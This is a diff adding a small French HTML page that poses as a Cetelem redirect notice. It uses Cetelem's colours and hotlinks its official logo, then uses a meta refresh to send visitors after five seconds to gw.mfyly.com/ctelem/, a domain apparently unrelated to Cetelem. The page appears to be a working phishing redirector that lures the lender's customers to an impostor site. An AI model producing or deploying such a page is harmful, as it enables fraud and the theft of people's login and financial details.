@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="5;url=https://gw.mfyly.com/ctelem/">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirection vers Cetelem</title>
+    <style>
+        body {
+            background-color: #f5f5f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            animation: fadeIn 2s ease-in-out;
+        }
+        .logo {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background-color: #00a651; /* Vert pur Cetelem */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px auto;
+            box-shadow: 0 0 20px rgba(0, 166, 81, 0.6);
+            animation: pulse 1.5s infinite;
+        }
+        .logo img {
+            width: 60px;
+            height: auto;
+        }
+        .message {
+            font-size: 1.2rem;
+            color: #333;
+        }
+        @keyframes fadeIn {
+            from {opacity: 0; transform: translateY(20px);}
+            to {opacity: 1; transform: translateY(0);}
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(0, 166, 81, 0.6); }
+            50% { box-shadow: 0 0 30px rgba(0, 166, 81, 1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.cetelem.fr/content/dam/cetelem/refonte/logo/Cetelem_logo.svg">
+        </div>
+        <p class="message">Vous serez redirigé vers Cetelem dans quelques instants...</p>
+    </div>
+</body>
+</html>
